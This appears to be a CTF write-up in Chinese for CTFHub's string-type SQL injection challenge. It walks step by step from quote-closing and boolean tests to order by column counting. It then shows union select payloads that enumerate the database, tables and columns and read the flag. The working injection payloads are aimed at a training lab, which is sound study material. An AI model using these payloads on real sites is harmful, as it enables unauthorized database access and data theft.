---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 字符型注入"
date: 2026-10-26

skill: "web-sql/字符型注入"
completed: true
---

# CTFHub Writeup - 字符型注入

## 题目类型

Web

## 题目描述

题目名称：字符型注入；平台：CTFHub；方向：Web。

## 解题过程

<br>1. 正常访问参数 1，页面回显拼接后的 SQL 为 select \* from news where id='1'，输出 ID: 1、Data: ctfhub。
<br>2. 输入 1'，页面显示的 SQL 为 select \* from news where id='1''，输出为空、仅保留 SQL 行；记录中据此判断多余的引号导致语法错误，证明该处存在字符串闭合边界。
<br>3. 构造 1' and '1'='1，SQL 为 select \* from news where id='1' and '1'='1'，回显 ID: 1、Data: ctfhub；构造 1' and '1'='2，OUT 为空，形成真假两种回显。
<br>4. 使用 1' order by 2\# 时回显正常，使用 1' order by 3\# 时 OUT 为空，记录中得出结论为 2 列；页面显示的是拼接后的原始字符串，因此仍能看到 \#'，而 MySQL 会将 \# 之后的内容作为注释忽略。
<br>5. 使用 -1' union select 1,2\# 时回显 ID: 1、Data: 2；记录中说明 '-1' 在库中无匹配行，因此联合查询构造的行占据回显位。
<br>6. 使用 -1' union select 1,database()\# 查询当前库名，回显 Data: sqli。
<br>7. 使用 -1' union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema=database()\# 查询当前库的表，回显 Data: flag,news。
<br>8. 使用 -1' union select 1,group\_concat(column\_name) from information\_schema.columns where table\_name='flag'\# 查询 flag 表的列名，回显 Data: flag。
<br>9. 使用 -1' union select 1,flag from flag\# 读取 flag 字段，页面回显 Data: ctfhub\{3dbf0f5434bc5140d6ec7bf6\}。

## 疑问与解答

### 1.

<br>问题：字符型注入为什么要先闭合单引号？
<br>解答：字符型注入的参数被放在 SQL 字符串字面量中，直接追加逻辑表达式仍处于引号内部，无法改变查询结构；需要先用单引号闭合原字符串，再用注释符去掉原 SQL 末尾的引号，才能让后续注入语句按预期执行。

### 2.

<br>问题：order by 2\# 中页面为什么还会显示 \#'？
<br>解答：页面回显的是程序拼接后的原始 SQL 字符串，不代表数据库实际执行的全部内容；MySQL 中 \# 表示行注释，实际执行时会忽略其后的字符，因此注入语句能够正常闭合并执行。

### 3.

<br>问题：联合查询显位时为什么常使用 -1 作为原查询条件？
<br>解答：联合查询要求前后查询列数一致；让原查询条件匹配不到数据，可以减少原查询结果对回显位的干扰，使 union 后构造的 1、2 等测试值直接显示在页面上。


## 本题的核心逻辑：


<br>本题的核心是字符型 SQL 注入：输入被拼接进单引号包围的字符串条件中，需要先闭合引号并用注释符处理原 SQL 尾部，随后通过布尔真假回显确认注入成立，再用 order by 判断列数。

<br>确认列数后，可以利用 union select 将自定义查询结果放入回显列，并通过 database()、information\_schema.tables 和 information\_schema.columns 逐层获取库名、表名和列名，最后读取目标字段。


## 笔记

这道题主要学习了：

<br>1. 字符型注入与数字型注入的判断差异在于是否需要闭合引号；输入 1' 造成多余引号并破坏语法，说明参数位于字符串边界内，而 \# 可用于注释掉原 SQL 末尾的引号。
<br>2. 联合查询需要保证列数一致，并尽量让原查询无结果，以便让 union 构造的行出现在回显位；之后可按库名、表名、列名、字段值的顺序逐步枚举数据。
